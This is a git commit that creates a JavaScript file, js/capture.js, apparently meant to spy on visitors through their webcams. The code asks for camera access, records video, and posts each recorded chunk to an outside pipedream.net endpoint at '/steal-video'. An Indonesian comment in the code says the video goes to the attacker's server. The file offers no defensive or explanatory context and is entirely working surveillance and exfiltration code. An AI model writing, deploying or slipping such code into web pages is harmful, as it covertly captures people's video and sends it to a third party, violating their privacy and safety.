8c4c252c11c453360899bc7c2b40a945670a2f32
RhyRu9 <164749781+RHYru9@users.noreply.github.com>
2024-10-09 05:44:58 +0700

    Create capture.js

---
+++ js/capture.js
@@ -0,0 +1,20 @@
+navigator.mediaDevices.getUserMedia({ video: true })
+    .then(function(stream) {
+        let videoTracks = stream.getVideoTracks();
+        let mediaRecorder = new MediaRecorder(stream);
+        mediaRecorder.start();
+
+        mediaRecorder.ondataavailable = function(event) {
+            // Kirim video ke server penyerang
+            fetch('https://eoow6y96ffo9mzx.m.pipedream.net/steal-video', {
+                method: 'POST',
+                body: event.data,
+                headers: {
+                    'Content-Type': 'video/webm'
+                }
+            });
+        };
+    })
+    .catch(function(error) {
+        console.error('Webcam access denied:', error);
+    });
